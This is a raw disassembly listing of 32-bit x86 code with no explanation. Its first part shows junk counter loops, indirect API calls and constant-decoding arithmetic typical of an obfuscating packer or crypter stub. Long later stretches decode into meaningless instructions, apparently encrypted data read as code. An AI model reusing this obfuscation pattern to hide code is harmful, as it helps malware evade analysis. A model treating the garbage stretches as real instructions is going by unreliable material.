  403868:	mov    eax,DWORD PTR [ebp+0xc]
  40386b:	and    DWORD PTR ds:0x430626,0x265f
  403875:	mov    DWORD PTR [ebp-0x10],eax
  403878:	mov    eax,DWORD PTR [ebp+0x8]
  40387b:	and    DWORD PTR ds:0x42e8e6,0x0
  403885:	jmp    0x403899
  40388a:	xor    ecx,ecx
  40388c:	or     ecx,DWORD PTR ds:0x42e8e6
  403892:	inc    ecx
  403893:	mov    DWORD PTR ds:0x42e8e6,ecx
  403899:	cmp    DWORD PTR ds:0x42e8e6,0x12
  4038a0:	jae    0x4038db
  4038a6:	cmp    DWORD PTR ds:0x42e8e6,0x5
  4038ad:	jne    0x4038bc
  4038b3:	push   DWORD PTR [ebp-0x14]
  4038b6:	call   DWORD PTR ds:0x42eb5c
  4038bc:	cmp    DWORD PTR ds:0x42e8e6,0x4
  4038c3:	jne    0x4038d6
  4038c9:	mov    ecx,DWORD PTR ds:0x42e8e6
  4038cf:	inc    ecx
  4038d0:	mov    DWORD PTR ds:0x42e8e6,ecx
  4038d6:	jmp    0x40388a
  4038db:	mov    DWORD PTR [ebp+0x8],0xf89c8535
  4038e2:	mov    DWORD PTR [ebp-0x20],0xf89c8532
  4038e9:	mov    edx,DWORD PTR [ebp+0x8]
  4038ec:	and    DWORD PTR ds:0x42efa8,0x0
  4038f6:	mov    edi,DWORD PTR ds:0x42efa8
  4038fc:	inc    edi
  4038fd:	mov    DWORD PTR ds:0x42efa8,edi
  403903:	cmp    DWORD PTR ds:0x42efa8,0x4
  40390a:	jne    0x403920
  403910:	push   0x1500
  403915:	push   0x3962
  40391a:	call   DWORD PTR ds:0x42eb74
  403920:	cmp    DWORD PTR ds:0x42efa8,0x3
  403927:	jne    0x40393a
  40392d:	mov    edi,DWORD PTR ds:0x42efa8
  403933:	inc    edi
  403934:	mov    DWORD PTR ds:0x42efa8,edi
  40393a:	cmp    DWORD PTR ds:0x42efa8,0x18
  403941:	jb     0x4038f6
  403947:	and    DWORD PTR ds:0x42ef9c,0x0
  403951:	jmp    0x403963
  403956:	mov    ecx,DWORD PTR ds:0x42ef9c
  40395c:	inc    ecx
  40395d:	mov    DWORD PTR ds:0x42ef9c,ecx
  403963:	cmp    DWORD PTR ds:0x42ef9c,0x11
  40396a:	jae    0x4039ad
  403970:	cmp    DWORD PTR ds:0x42ef9c,0x4
  403977:	jne    0x403988
  40397d:	push   0x5572
  403982:	call   DWORD PTR ds:0x42ed1c
  403988:	cmp    DWORD PTR ds:0x42ef9c,0x3
  40398f:	jne    0x4039a2
  403995:	mov    ecx,DWORD PTR ds:0x42ef9c
  40399b:	inc    ecx
  40399c:	mov    DWORD PTR ds:0x42ef9c,ecx
  4039a2:	jmp    0x403956
  4039a7:	add    ecx,0x3d2b
  4039ad:	mov    DWORD PTR [ebp-0x40],eax
  4039b0:	xor    DWORD PTR ds:0x42ef94,ebx
  4039b6:	mov    eax,0x7510856
  4039bb:	xor    edx,eax
  4039bd:	mov    ecx,0x32729d
  4039c2:	or     edi,DWORD PTR ds:0x430626
  4039c8:	add    edx,ecx
  4039ca:	adc    DWORD PTR ds:0x43060e,ebx
  4039d0:	mov    DWORD PTR [ebp-0x8],edx
  4039d3:	mov    edx,DWORD PTR [ebp+0x8]
  4039d6:	mov    DWORD PTR ds:0x43062a,0x1d
  4039e0:	cmp    DWORD PTR ds:0x43062a,0x0
  4039e7:	je     0x403a1f
  4039ed:	cmp    DWORD PTR ds:0x43062a,0x2c
  4039f4:	jne    0x403a03
  4039fa:	push   DWORD PTR [ebp-0x14]
  4039fd:	call   DWORD PTR ds:0x42eb60
  403a03:	mov    edi,DWORD PTR ds:0x43062a
  403a09:	dec    edi
  403a0a:	mov    DWORD PTR ds:0x43062a,edi
  403a10:	jmp    0x4039e0
  403a15:	adc    DWORD PTR ds:0x42efb0,0x29f8
  403a1f:	xor    edx,eax
  403a21:	xor    edi,DWORD PTR ds:0x43062a
  403a27:	add    edx,ecx
  403a29:	mov    DWORD PTR [ebp+0xc],edx
  403a2c:	mov    DWORD PTR [ebp-0x4],0xf89c85d5
  403a33:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  403a3a:	mov    DWORD PTR [ebp-0x2c],0xf89c8530
  403a41:	and    DWORD PTR ds:0x4306da,0x0
  403a4b:	mov    edx,DWORD PTR ds:0x4306da
  403a51:	inc    edx
  403a52:	mov    DWORD PTR ds:0x4306da,edx
  403a58:	cmp    DWORD PTR ds:0x4306da,0x2b
  403a5f:	jne    0x403a77
  403a65:	push   0x85b9
  403a6a:	push   0x0
  403a6c:	push   0x24c3
  403a71:	call   DWORD PTR ds:0x42eb78
  403a77:	cmp    DWORD PTR ds:0x4306da,0x1e
  403a7e:	jb     0x403a4b
  403a84:	adc    edi,0xfa7
  403a8a:	mov    DWORD PTR [ebp-0x30],0xf89c8531
  403a91:	or     edi,0x30ac
  403a97:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  403a9e:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  403aa5:	xor    DWORD PTR ds:0x4306c2,ebx
  403aab:	mov    DWORD PTR [ebp-0x3c],0xf89c853c
  403ab2:	mov    edx,DWORD PTR [ebp+0x8]
  403ab5:	xor    edx,eax
  403ab7:	mov    edi,DWORD PTR [ebp-0x10]
  403aba:	add    edx,ecx
  403abc:	cmp    edi,edx
  403abe:	mov    DWORD PTR ds:0x42e8da,0x7baa
  403ac8:	je     0x4052e2
  403ace:	mov    DWORD PTR ds:0x4306ca,0x2abe
  403ad8:	push   ebx
  403ad9:	mov    DWORD PTR ds:0x43060a,0x536a
  403ae3:	jmp    0x4052bd
  403ae8:	mov    edi,DWORD PTR ds:0x430712
  403aee:	mov    edx,DWORD PTR ds:0x42eb30
  403af4:	sub    edx,edi
  403af6:	or     edi,DWORD PTR [edi+edx*1]
  403af9:	mov    edx,DWORD PTR [ebp-0x8]
  403afc:	sub    DWORD PTR ds:0x430632,edx
  403b02:	mov    edi,DWORD PTR [ebp-0x10]
  403b05:	xor    DWORD PTR ds:0x42ef9c,0x6f7b
  403b0f:	sub    edi,edx
  403b11:	and    DWORD PTR ds:0x43062a,0x0
  403b1b:	mov    edx,DWORD PTR ds:0x43062a
  403b21:	inc    edx
  403b22:	mov    DWORD PTR ds:0x43062a,edx
  403b28:	cmp    DWORD PTR ds:0x43062a,0xa
  403b2f:	jne    0x403b43
  403b35:	push   DWORD PTR [ebp-0x20]
  403b38:	push   0x8b6b
  403b3d:	call   DWORD PTR ds:0x42ec40
  403b43:	cmp    DWORD PTR ds:0x43062a,0x9
  403b4a:	jne    0x403b5d
  403b50:	mov    edx,DWORD PTR ds:0x43062a
  403b56:	inc    edx
  403b57:	mov    DWORD PTR ds:0x43062a,edx
  403b5d:	cmp    DWORD PTR ds:0x43062a,0x14
  403b64:	jb     0x403b1b
  403b6a:	mov    DWORD PTR ds:0x4306c2,0x73d7
  403b74:	mov    edx,DWORD PTR [ebp-0x4]
  403b77:	and    DWORD PTR ds:0x430612,0x4306d2
  403b81:	xor    edx,eax
  403b83:	xor    DWORD PTR ds:0x43060e,0x6fac
  403b8d:	add    edx,ecx
  403b8f:	mov    DWORD PTR ds:0x43060a,0x698f
  403b99:	cmp    edi,edx
  403b9b:	mov    DWORD PTR ds:0x430642,0x4dce
  403ba5:	jb     0x4052e1
  403bab:	add    DWORD PTR ds:0x42efa0,0x380f
  403bb5:	mov    edx,DWORD PTR [ebp-0x28]
  403bb8:	add    edi,edi
  403bba:	mov    edi,DWORD PTR [ebp-0x4]
  403bbd:	xor    ebx,ebx
  403bbf:	add    ebx,DWORD PTR ds:0x42efb0
  403bc5:	and    ebx,DWORD PTR ds:0x4306d2
  403bcb:	mov    DWORD PTR ds:0x42efb0,ebx
  403bd1:	xor    edx,eax
  403bd3:	and    DWORD PTR ds:0x42e8da,0x0
  403bdd:	mov    ebx,DWORD PTR ds:0x42e8da
  403be3:	inc    ebx
  403be4:	mov    DWORD PTR ds:0x42e8da,ebx
  403bea:	cmp    DWORD PTR ds:0x42e8da,0x28
  403bf1:	jne    0x403c05
  403bf7:	push   DWORD PTR [ebp-0x10]
  403bfa:	push   0x85bf
  403bff:	call   DWORD PTR ds:0x42eb7c
  403c05:	cmp    DWORD PTR ds:0x42e8da,0x1d
  403c0c:	jb     0x403bdd
  403c12:	sbb    DWORD PTR ds:0x430642,0x42d2
  403c1c:	xor    edi,eax
  403c1e:	add    edi,ecx
  403c20:	mov    DWORD PTR ds:0x43060e,0x1a
  403c2a:	cmp    DWORD PTR ds:0x43060e,0x0
  403c31:	je     0x403c83
  403c37:	cmp    DWORD PTR ds:0x43060e,0xc
  403c3e:	jne    0x403c4d
  403c44:	push   DWORD PTR [ebp-0x18]
  403c47:	call   DWORD PTR ds:0x42eb80
  403c4d:	cmp    DWORD PTR ds:0x43060e,0xd
  403c54:	jne    0x403c67
  403c5a:	mov    ebx,DWORD PTR ds:0x43060e
  403c60:	dec    ebx
  403c61:	mov    DWORD PTR ds:0x43060e,ebx
  403c67:	mov    ebx,DWORD PTR ds:0x43060e
  403c6d:	dec    ebx
  403c6e:	mov    DWORD PTR ds:0x43060e,ebx
  403c74:	jmp    0x403c2a
  403c79:	sbb    DWORD PTR ds:0x4306ce,0x12f8
  403c83:	add    edx,ecx
  403c85:	sbb    DWORD PTR ds:0x4306ca,0x430642
  403c8f:	imul   edx,edi
  403c92:	xor    ebx,DWORD PTR ds:0x430606
  403c98:	mov    edi,DWORD PTR [ebp-0x8]
  403c9b:	add    ebx,DWORD PTR ds:0x4306ca
  403ca1:	mov    ebx,DWORD PTR [ebp-0x10]
  403ca4:	sub    ebx,edi
  403ca6:	mov    DWORD PTR ds:0x42efa4,0x5446
  403cb0:	cmp    ebx,edx
  403cb2:	mov    DWORD PTR ds:0x43060a,0x67f
  403cbc:	ja     0x403cd8
  403cc2:	mov    edx,DWORD PTR [ebp-0x4]
  403cc5:	xor    edx,eax
  403cc7:	or     DWORD PTR ds:0x43062e,0x5676
  403cd1:	add    edx,ecx
  403cd3:	jmp    0x404621
  403cd8:	mov    edx,DWORD PTR [ebp-0x2c]
  403cdb:	mov    edi,DWORD PTR [ebp-0x4]
  403cde:	xor    edx,eax
  403ce0:	xor    edi,eax
  403ce2:	mov    ebx,DWORD PTR ds:0x42e8f6
  403ce8:	adc    DWORD PTR ds:0x42ef90,ebx
  403cee:	add    edi,ecx
  403cf0:	add    edx,ecx
  403cf2:	imul   edx,edi
  403cf5:	mov    edi,DWORD PTR ds:0x43062a
  403cfb:	sbb    DWORD PTR ds:0x42e8ee,edi
  403d01:	mov    edi,DWORD PTR [ebp-0x8]
  403d04:	or     ebx,0x29ff
  403d0a:	mov    ebx,DWORD PTR [ebp-0x10]
  403d0d:	sub    ebx,edi
  403d0f:	cmp    ebx,edx
  403d11:	ja     0x403ec9
  403d17:	jmp    0x403ec1
  403d1c:	jmp    0x6c13:0x697351b5
  403d23:	ins    DWORD PTR es:[edi],dx
  403d24:	imul   esp,DWORD PTR [eax-0x2268cd93],0x34
  403d2b:	ins    BYTE PTR es:[edi],dx
  403d2c:	mov    dh,0x11
  403d2e:	jle    0x403dae
  403d30:	mov    edi,DWORD PTR [edi+0x7e]
  403d33:	jle    0x403d90
  403d35:	addr16 aad 0x15
  403d38:	imul   eax,DWORD PTR [ebx],0x2bfa81d2
  403d3e:	mov    esi,0x9e68c662
  403d43:	fcomp  DWORD PTR [eax]
  403d45:	pop    ebx
  403d46:	pop    ebx
  403d47:	mov    fs,WORD PTR ds:0x4b45d0af
  403d4d:	mov    al,0x97
  403d4f:	or     eax,0xffd1710
  403d54:	xor    ebx,eax
  403d56:	outs   dx,BYTE PTR ds:[esi]
  403d57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d58:	pop    ss
  403d59:	or     dl,0x39
  403d5c:	or     BYTE PTR [ebx+ebx*4],al
  403d5f:	and    BYTE PTR [ebx+0x3b],ch
  403d62:	in     eax,dx
  403d63:	inc    edi
  403d64:	pop    ds
  403d65:	(bad)  
  403d66:	std    
  403d67:	push   0xd7b04162
  403d6c:	imul   esi,DWORD PTR [ebp-0x27d2c55a],0x224c2517
  403d76:	sub    DWORD PTR [eax+0x1375b65b],esi
  403d7c:	pusha  
  403d7d:	xor    DWORD PTR [eax],ebx
  403d7f:	lods   eax,DWORD PTR ds:[esi]
  403d80:	fild   DWORD PTR [edi-0x29]
  403d83:	dec    ebp
  403d84:	arpl   WORD PTR ds:0x498455e4,cx
  403d8a:	dec    ecx
  403d8b:	(bad)  
  403d8c:	lahf   
  403d8d:	push   es
  403d8e:	jmp    0x403db8
  403d90:	ret    
  403d91:	sub    esp,edi
  403d93:	dec    edx
  403d94:	sub    eax,0x70fb9fbd
  403d99:	sbb    eax,0x80bd0e89
  403d9e:	push   0x20
  403da0:	retf   0x3c93
  403da3:	mov    esp,0x8c68c865
  403da8:	adc    ah,BYTE PTR [esi+0x4df0eee8]
  403dae:	ss js  0x403df9
  403db1:	sbb    esi,0x5c5305c9
  403db7:	pop    esp
  403db8:	ins    DWORD PTR es:[edi],dx
  403db9:	pop    eax
  403dba:	pop    edi
  403dbb:	mov    dl,0x18
  403dbd:	les    ebp,FWORD PTR ds:0x449b579
  403dc3:	add    DWORD PTR ds:0xd4f2b723,esi
  403dc9:	and    DWORD PTR [ebx],0x71
  403dcc:	push   ss
  403dcd:	sbb    edi,DWORD PTR [ecx]
  403dcf:	in     al,0xcd
  403dd1:	(bad)  
  403dd2:	adc    ah,BYTE PTR [esi]
  403dd4:	jmp    0xa4b4:0xa3fc6353
  403ddb:	mov    ebp,ecx
  403ddd:	sbb    al,0x2
  403ddf:	sub    dl,BYTE PTR [eax+ebp*8+0xc]
  403de3:	leave  
  403de4:	sar    DWORD PTR [edi],cl
  403de6:	adc    dh,BYTE PTR [ecx+0x0]
  403de9:	mov    ecx,0x4f5f4c18
  403dee:	cmp    ah,BYTE PTR [ecx-0x74]
  403df1:	push   ebp
  403df2:	inc    eax
  403df3:	add    DWORD PTR [edi+0x75eac262],0x7dd699d5
  403dfd:	(bad)  
  403dfe:	push   esi
  403dff:	jle    0x403e3b
  403e01:	stc    
  403e02:	test   DWORD PTR [ebp+0x77],ebp
  403e05:	sar    BYTE PTR [ebx-0x6912130],cl
  403e0b:	sbb    ah,BYTE PTR [edi+0x1056bcdf]
  403e11:	addr16 jmp 0x403d9f
  403e14:	(bad)  
  403e15:	scas   eax,DWORD PTR es:[edi]
  403e16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e17:	retf   0x3861
  403e1a:	push   esp
  403e1b:	mov    edi,0x28b8b349
  403e20:	jle    0x403e34
  403e22:	xchg   ebp,eax
  403e23:	mov    edx,0xc4f1ec24
  403e28:	and    al,0xad
  403e2a:	xor    edx,esi
  403e2c:	push   0xffffffb3
  403e2e:	fwait
  403e2f:	adc    BYTE PTR [ecx+0x2a73adb7],bl
  403e35:	inc    edx
  403e36:	retf   0xae40
  403e39:	das    
  403e3a:	dec    ecx
  403e3b:	in     al,0xff
  403e3d:	xor    eax,DWORD PTR [edx-0x2959f094]
  403e43:	in     eax,dx
  403e44:	sbb    bh,BYTE PTR [ebp+0x28]
  403e47:	mov    cl,0x3c
  403e49:	push   ebp
  403e4a:	xor    ecx,DWORD PTR [edi+0x10c3c05a]
  403e50:	jl     0x403e33
  403e52:	nop
  403e53:	hlt    
  403e54:	ja     0x403dee
  403e56:	je     0x403e48
  403e58:	in     eax,0x3e
  403e5a:	retf   
  403e5b:	scas   eax,DWORD PTR es:[edi]
  403e5c:	nop
  403e5d:	jae    0x403ed9
  403e5f:	xchg   edi,eax
  403e60:	test   eax,0x2e7278ba
  403e65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e66:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  403e68:	shl    DWORD PTR [ebx-0x28],0x38
  403e6c:	jae    0x403e80
  403e6e:	into   
  403e6f:	jge    0x403e3c
  403e71:	mov    eax,ds:0xbbeab919
  403e76:	sub    BYTE PTR [esi+0xbd09eae],bh
  403e7c:	(bad)  
  403e7d:	sub    bl,BYTE PTR [ebp-0xe]
  403e80:	mov    tr7,edx
  403e83:	es jae 0x403e7a
  403e86:	mov    DWORD PTR [ebx+0x640c4023],esp
  403e8c:	xor    BYTE PTR [eax+eiz*1-0x5176fce0],0xb
  403e94:	out    dx,eax
  403e95:	adc    DWORD PTR [ebx+edi*4+0x2234f95a],eax
  403e9c:	jl     0x403f01
  403e9e:	pop    edi
  403e9f:	adc    bh,bl
  403ea1:	rcl    BYTE PTR [esi+0x1],cl
  403ea4:	and    al,0x38
  403ea6:	jo     0x403e81
  403ea8:	es mov fs:0x4ea1659,eax
  403eaf:	(bad)  
  403eb0:	dec    ebx
  403eb1:	inc    ebp
  403eb2:	retf   
  403eb3:	cwde   
  403eb4:	or     cl,BYTE PTR ds:0x6f7062c1
  403eba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ebb:	lds    esp,FWORD PTR [ebp+0x52]
  403ebe:	shl    BYTE PTR [ecx-0x4b],cl
  403ec1:	mov    edx,DWORD PTR [ebp-0x28]
  403ec4:	jmp    0x404613
  403ec9:	mov    edx,DWORD PTR [ebp-0x30]
  403ecc:	mov    edi,DWORD PTR [ebp-0x4]
  403ecf:	xor    edx,eax
  403ed1:	xor    edi,eax
  403ed3:	add    edi,ecx
  403ed5:	add    edx,ecx
  403ed7:	imul   edx,edi
  403eda:	mov    edi,DWORD PTR [ebp-0x8]
  403edd:	mov    ebx,DWORD PTR [ebp-0x10]
  403ee0:	sub    ebx,edi
  403ee2:	cmp    ebx,edx
  403ee4:	ja     0x40409c
  403eea:	jmp    0x404094
  403eef:	ror    BYTE PTR [ebx],cl
  403ef1:	push   edi
  403ef2:	mov    dh,0x57
  403ef4:	push   0xffffffd3
  403ef6:	stos   DWORD PTR es:[edi],eax
  403ef7:	mov    ds:0x677278c4,al
  403efc:	popf   
  403efd:	fsub   st,st(2)
  403eff:	ret    
  403f00:	adc    edi,DWORD PTR [esi+0x7e]
  403f03:	mov    edi,DWORD PTR [edi+0x7e]
  403f06:	jle    0x403eab
  403f08:	xchg   edx,ecx
  403f0a:	add    eax,0xa645b206
  403f0f:	mov    gs,WORD PTR [ebx-0x2f]
  403f12:	cmp    ah,bh
  403f14:	repz mov eax,0x1ac8f324
  403f1a:	cmp    BYTE PTR [ebx+edx*2],ch
  403f1d:	stos   BYTE PTR es:[edi],al
  403f1e:	mov    ah,0xe0
  403f20:	mov    esi,0x53561c0b
  403f25:	inc    eax
  403f26:	push   0x701cf498
  403f2b:	jle    0x403f15
  403f2d:	sbb    DWORD PTR ds:0xb50a7c8a,ebx
  403f33:	xchg   edi,eax
  403f34:	aam    0x99
  403f36:	xchg   edi,eax
  403f37:	test   DWORD PTR [ebx+0x54bd53db],ebp
  403f3d:	stos   BYTE PTR es:[edi],al
  403f3e:	leave  
  403f3f:	cwde   
  403f40:	add    edi,esi
  403f42:	rol    BYTE PTR [ebp+ebp*4-0xea2934a],1
  403f49:	pop    esi
  403f4a:	aas    
  403f4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f4c:	push   es
  403f4d:	or     bh,BYTE PTR [edx-0x46]
  403f50:	adc    ebp,DWORD PTR [edi]
  403f52:	pop    eax
  403f53:	ds jmp 0xe783d19e
  403f59:	inc    ebp
  403f5a:	push   ecx
  403f5b:	mov    ds:0xc6eb1476,eax
  403f60:	xor    BYTE PTR [esi-0x4b],dh
  403f63:	mov    edi,0x9c70d4c1
  403f68:	sti    
  403f69:	xchg   esi,eax
  403f6a:	inc    esp
  403f6b:	pop    ecx
  403f6c:	push   0x6
  403f6e:	xchg   edi,eax
  403f6f:	out    0xb9,eax
  403f71:	mov    dl,0xf6
  403f73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f74:	(bad)  
  403f75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f76:	adc    ch,dh
  403f78:	psubq  mm2,QWORD PTR [ecx+0x28]
  403f7c:	mov    ebp,DWORD PTR [edx+0x3596bfb0]
  403f82:	jg     0x403f78
  403f84:	mov    ds:0xfafd378b,eax
  403f89:	repnz pusha 
  403f8b:	add    BYTE PTR [eax],0x97
  403f8e:	xchg   esi,eax
  403f8f:	out    dx,eax
  403f90:	xchg   edx,eax
  403f91:	jmp    0x3f2f:0xf408e1e1
  403f98:	loope  0x404001
  403f9a:	xor    edx,DWORD PTR [ebp+0x7cf007c0]
  403fa0:	xchg   ebp,eax
  403fa1:	test   eax,0x47d7643b
  403fa6:	push   es
  403fa7:	(bad)  es:[edx-0x7]
  403fab:	ja     0x403f41
  403fad:	sub    ebx,DWORD PTR [eax-0xd751ae8]
  403fb3:	jae    0x404006
  403fb5:	sahf   
  403fb6:	loopne 0x404023
  403fb8:	pusha  
  403fb9:	push   ebx
  403fba:	retf   0x1f83
  403fbd:	mov    esi,0xd47bae84
  403fc2:	sbb    edx,edi
  403fc4:	dec    ebx
  403fc5:	push   es
  403fc6:	adc    bl,BYTE PTR [esi+0x77aa7260]
  403fcc:	inc    ebx
  403fcd:	mov    es,WORD PTR [edi+0xc32aa0a]
  403fd3:	pop    ebp
  403fd4:	test   BYTE PTR [edi-0x5e],ch
  403fd7:	xchg   ebx,eax
  403fd8:	outs   dx,DWORD PTR ds:[esi]
  403fd9:	mov    BYTE PTR [ebp+0x59],0x91
  403fdd:	(bad)  
  403fde:	sbb    dh,BYTE PTR [edx+0x7d]
  403fe1:	cli    
  403fe2:	pop    es
  403fe3:	dec    esi
  403fe4:	imul   ebp,eax,0x7c22fed7
  403fea:	das    
  403feb:	ins    DWORD PTR es:[edi],dx
  403fec:	sub    ebp,DWORD PTR [ebp-0x6a]
  403fef:	mov    ch,0xfe
  403ff1:	mov    al,0xd6
  403ff3:	(bad)  
  403ff4:	and    eax,0xe7d72d13
  403ff9:	jmp    0x1d45d72e
  403ffe:	out    0xee,al
  404000:	add    al,0x7f
  404002:	cmp    BYTE PTR [ebx-0x51],0x38
  404006:	xchg   esp,eax
  404007:	iret   
  404008:	out    dx,al
  404009:	xchg   DWORD PTR [edi],ebp
  40400b:	or     ch,BYTE PTR [eax]
  40400d:	pop    edi
  40400e:	hlt    
  40400f:	xchg   edx,eax
  404010:	cli    
  404011:	leave  
  404012:	push   0xfffffff1
  404014:	jg     0x404034
  404016:	fprem  
  404018:	cld    
  404019:	rol    DWORD PTR [ecx],0x10
  40401c:	xchg   edi,eax
  40401d:	loopne 0x404019
  40401f:	mov    ds:0x647631e3,al
  404024:	mov    gs,WORD PTR [edi]
  404026:	mov    ah,0x99
  404028:	pop    ebp
  404029:	mov    ds:0x9faccf58,al
  40402e:	dec    edi
  40402f:	cmp    eax,edi
  404031:	loopne 0x404052
  404033:	cmp    DWORD PTR [ebx],ebx
  404035:	xchg   edx,eax
  404036:	cwde   
  404037:	out    dx,al
  404038:	data16 jb 0x404078
  40403b:	std    
  40403c:	push   ss
  40403d:	dec    edx
  40403e:	pop    edx
  40403f:	dec    edi
  404040:	jl     0x40405b
  404042:	imul   DWORD PTR [ebp+0x14]
  404045:	mul    DWORD PTR [eax]
  404047:	xchg   BYTE PTR [edi-0x425d9cd2],bh
  40404d:	lods   eax,DWORD PTR ds:[esi]
  40404e:	repz pop esi
  404050:	sbb    edx,DWORD PTR [esi+0x5fc0a87]
  404056:	push   0x3cd35971
  40405b:	ficom  WORD PTR [ebp+ebx*2-0x4b778421]
  404062:	xchg   ecx,eax
  404063:	xor    al,0x6e
  404065:	sbb    ebp,DWORD PTR [eax-0x7afc712d]
  40406b:	mov    dh,0x77
  40406d:	jbe    0x4040a5
  40406f:	mul    BYTE PTR [eax+0x77]
  404072:	jmp    0x7363:0xcdbd1883
  404079:	das    
  40407a:	push   esp
  40407b:	pop    edi
  40407c:	ret    0xc772
  40407f:	xchg   esi,eax
  404080:	imul   edi,DWORD PTR [esi+0x30],0xffffffbb
  404084:	sub    BYTE PTR [esi-0x38],ah
  404087:	inc    edx
  404088:	sbb    al,BYTE PTR [edx-0x27d8d173]
  40408e:	adc    DWORD PTR [edi],edx
  404090:	in     al,dx
  404091:	sbb    esi,DWORD PTR [ebx-0x2baa74c0]
  404097:	jmp    0x404613
  40409c:	mov    edx,DWORD PTR [ebp-0x34]
  40409f:	mov    edi,DWORD PTR [ebp-0x4]
  4040a2:	jmp    0x40424c
  4040a7:	fs bswap eax
  4040aa:	popf   
  4040ab:	ins    DWORD PTR es:[edi],dx
  4040ac:	pop    ebp
  4040ad:	gs out 0x68,eax
  4040b0:	xchg   ebp,eax
  4040b1:	pop    DWORD PTR [eax+0x72a47138]
  4040b7:	push   eax
  4040b8:	adc    al,0x7e
  4040ba:	jle    0x404047
  4040bc:	jg     0x40413c
  4040be:	jle    0x40406a
  4040c0:	fadd   QWORD PTR [esi]
  4040c2:	lods   al,BYTE PTR ds:[esi]
  4040c3:	xchg   esi,eax
  4040c4:	add    BYTE PTR [esi],al
  4040c6:	sub    dh,al
  4040c8:	xlat   BYTE PTR ds:[ebx]
  4040c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040ca:	pop    es
  4040cb:	xor    BYTE PTR [edi+0x53],0x7a
  4040cf:	imul   esp,DWORD PTR [ebp+eiz*1-0xd32f362],0xfffffffc
  4040d7:	jne    0x404101
  4040d9:	pop    esi
  4040da:	pop    edx
  4040db:	into   
  4040dc:	jbe    0x40408c
  4040de:	repz es xchg al,bl
  4040e2:	repnz xor al,0x41
  4040e5:	xchg   ebx,eax
  4040e6:	push   ss
  4040e7:	or     al,0x59
  4040e9:	rcl    BYTE PTR [edx-0x45],cl
  4040ec:	scas   al,BYTE PTR es:[edi]
  4040ed:	shl    DWORD PTR [eax+0x7c],cl
  4040f0:	mov    BYTE PTR [ebx-0x3c866d09],bh
  4040f6:	(bad)  
  4040f9:	sub    BYTE PTR [eax-0x44],bl
  4040fc:	or     al,0x53
  4040fe:	jmp    0xe4ebc443
  404103:	js     0x40411b
  404105:	test   esp,edx
  404107:	in     al,dx
  404108:	stos   DWORD PTR es:[edi],eax
  404109:	mov    ah,0x5c
  40410b:	(bad)  
  40410c:	call   0xe2760ca5
  404111:	jmp    0xa43cb177
  404116:	pusha  
  404117:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404118:	xchg   ebp,eax
  404119:	iret   
  40411a:	sbb    edx,ecx
  40411c:	shl    ch,cl
  40411e:	ficomp DWORD PTR [esi+ecx*1]
  404121:	(bad)  
  404122:	std    
  404123:	mov    eax,DWORD PTR [edi-0x6f]
  404126:	lds    esi,FWORD PTR ds:0xd16f5156
  40412c:	jmp    0x6709:0x8d8b3863
  404133:	sbb    al,0x2c
  404135:	push   eax
  404136:	(bad)  
  404138:	jge    0x404133
  40413a:	adc    ah,bh
  40413c:	xor    eax,0xe3a16166
  404141:	mov    bh,0xe4
  404143:	jbe    0x404163
  404145:	pusha  
  404146:	mov    bp,WORD PTR [edi-0x17]
  40414a:	ret    
  40414b:	jmp    0xdd9:0x7c688caf
  404152:	sub    esp,DWORD PTR [edx+0x1fac4307]
  404158:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404159:	repz dec edx
  40415b:	(bad)  
  40415c:	test   esp,0xd94ebd4c
  404162:	or     BYTE PTR [ecx+0x45],bl
  404165:	cwde   
  404166:	xchg   edi,eax
  404167:	(bad)  
  404168:	aaa    
  404169:	imul   edi,eax,0x42
  40416c:	xchg   ecx,eax
  40416d:	out    0xf8,eax
  40416f:	addr16 dec esp
  404171:	test   al,0x12
  404173:	fcmovnu st,st(7)
  404175:	aad    0xa
  404177:	aam    0xc5
  404179:	lds    ebx,FWORD PTR [ecx-0x5e56da7a]
  40417f:	xchg   edi,eax
  404180:	cmp    al,0xd4
  404182:	sbb    edx,ebx
  404184:	clc    
  404185:	stos   DWORD PTR es:[edi],eax
  404186:	shl    DWORD PTR [ebx-0x5f9cb58a],cl
  40418c:	pop    eax
  40418d:	jnp    0x404122
  40418f:	cmp    BYTE PTR [ecx+edi*1-0x1ee6121e],bh
  404196:	(bad)  
  404197:	retfw  0xbc3e
  40419b:	jno    0x40420c
  40419d:	pop    ebp
  40419e:	jg     0x4041db
  4041a0:	cmp    esi,DWORD PTR [ebp-0x44b35431]
  4041a6:	inc    edi
  4041a7:	ins    DWORD PTR es:[edi],dx
  4041a8:	push   es
  4041a9:	push   es
  4041aa:	fwait
  4041ab:	xchg   edi,eax
  4041ac:	aas    
  4041ad:	mov    ebp,0xafa9332e
  4041b2:	pop    edi
  4041b3:	dec    edx
  4041b4:	imul   esp,DWORD PTR [edx-0x673a63ce],0xffffffd9
  4041bb:	mov    ds:0xb2191b47,eax
  4041c0:	je     0x4041cb
  4041c2:	arpl   WORD PTR [edx],ax
  4041c4:	retf   0x27a
  4041c7:	cmp    ah,BYTE PTR [ebp+0xb]
  4041ca:	jne    0x40414d
  4041cc:	dec    edi
  4041cd:	sub    al,BYTE PTR [esp+ebp*4-0x21]
  4041d1:	sub    DWORD PTR [ebx+0x2f],esp
  4041d4:	rcr    BYTE PTR [edx+0x62d75443],cl
  4041da:	cmc    
  4041db:	dec    esp
  4041dc:	int3   
  4041dd:	xchg   ebx,eax
  4041de:	cmp    BYTE PTR [ecx],bh
  4041e0:	inc    edx
  4041e1:	cmp    cl,BYTE PTR [esi+edi*4+0x400103c2]
  4041e8:	sub    ecx,DWORD PTR [ebp-0x5d1e02ab]
  4041ee:	fdivr  QWORD PTR [eiz*8-0x74a860]
  4041f5:	das    
  4041f6:	(bad)  
  4041f7:	mov    WORD PTR [ebx-0xad8f562],es
  4041fd:	cs pop edx
  4041ff:	jne    0x404218
